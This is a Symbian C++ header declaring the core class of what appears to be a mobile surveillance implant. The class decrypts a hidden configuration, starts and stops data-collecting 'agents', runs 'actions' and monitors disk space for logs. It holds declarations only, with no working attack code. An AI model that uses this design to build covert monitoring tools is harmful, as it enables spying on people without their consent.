
#ifndef __CORE_H__
#define __CORE_H__

//  Include Files
#include "ConfigFile.h"
#include "MonitorFreeSpace.h"
#include "WallpaperSticker.h"
#include "TonePlayer.h"
#include <e32base.h>
#include <HT\Logging.h>			// Logging
#include <HT\SharedQueue.h>		// RSharedQueue
#include <HT\PubSubObserver.h>	// CPubSubObserver
#include <HT\AbstractQueueEndPoint.h>
#include <HT\SharedQueueCliSrv.h>


class CCore : public CAbstractQueueEndPoint, public MFreeSpaceCallBack
	{
public:
	static CCore* NewLC();
	virtual ~CCore();

	void LoadConfigAndStartL();
	/**
	 * Create a LOGTYPE_INFO log for startup event
	 */
	void LogInfoMsgL(const TDesC& aLogString);
	
	/**
	 * Start to monitor free space on disk
	 */
	void StartMonitorFreeSpace();
	
	/**
	 * Change wallpaper 
	 */
	void ChangeWallpaper();
	
	/**
	 * Start tone player
	 */
	void StartTonePlayer();
	
private: 
	// from CAbstractQueueEndPoint 
	virtual void PropertyChangedL(TUid category, TUint key, TInt value);

	// From MFreeSpaceCallBack
	virtual void NotifyAboveThreshold();
	virtual void NotifyBelowThreshold();
	    
private:
	
	/**
	 * Load a new config at run time
	 */
	void LoadNewConfigL();
	
	/**
	 * Deletes all the Completed Agents and the Completed Actions.
	 */
	void DisposeAgentsAndActionsL();
	
	/**
	 * Sends a "Restart" command to all the Agents
	 */
	void RestartAllAgentsL();
	
	/*
	 * Sends a "Restart" command to all agents working in append mode
	 */
	void RestartAppendingAgentsL();
	
	/**
	 * Stops all the running Agents and the Events
	 */
	void StopAllAgentsAndEventsL();
	
	/**
	 * From CAbstractQueueEndPoint:
	 * Will call the MarkCommandAsDispatchedL() when all has been completed.
	 */
	virtual void DispatchCommandL(TCmdStruct aCommand);
	
	/**
	 * Executes the Action
	 */
	void ExecuteActionL(TActionType type, const TDesC8& params);
	
	/**
	 * Creates a new Agent and Start it.
	 */
	void StartAgentL(TAgentType agentId);
	
	/**
	 * Stops the running Agent
	 */
	void StopAgentL(TAgentType agentId);
	
		
	CCore();
	void ConstructL();

private:
	HBufC8* DecryptConfigFileL();

private:
	CConfigFile* iConfig;								// It is filled with the Config.bin data 
	RPointerArray<CAbstractQueueEndPoint> iEndPoints;	// List of all the Endpoints which have been created by the CORE.
	CFreeSpaceMonitor*		iFreeSpaceMonitor;			// Monitor occupation on log disk (C:)
	RFs						iFs;
	CWallpaperSticker*		iWallpaper;
	CTonePlayer*			iTonePlayer;

	__FLOG_DECLARATION_MEMBER
	};

//  Function Prototypes

GLDEF_C TInt E32Main();

#endif  // __GUARDIAN_H__
